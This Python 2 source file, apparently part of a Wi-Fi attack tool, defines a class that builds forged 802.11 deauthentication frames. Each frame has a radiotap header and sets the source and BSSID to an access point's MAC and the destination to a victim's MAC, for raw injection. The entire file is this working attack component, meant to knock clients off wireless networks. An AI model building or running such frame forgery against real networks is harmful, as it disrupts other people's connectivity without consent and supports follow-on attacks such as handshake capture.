import struct
from lib.Logger import Logger
from frames.Radiotap802_11 import Radiotap802_11

class Deauth():
    @staticmethod
    def getDeauthFrame(ap, target):
        Logger.log('Sending deauh from {} to {}'.format(ap.mac, target.mac))
        deauth_frame = struct.pack('!H', 1)
        return Radiotap802_11.getRadiotapHeader() + Deauth.getDot11(ap.mac, target.mac) + deauth_frame

    @staticmethod
    def getDot11(mac_src, mac_dst):
        dot11_type_sub = 0xc0
        dot11_flags = 0
        dot11_seq = 1810
        dot11 = struct.pack('HH6s6s6sH', dot11_type_sub, dot11_flags, mac_dst.decode("hex"), mac_src.decode("hex"), mac_src.decode("hex"), dot11_seq)
        return dot11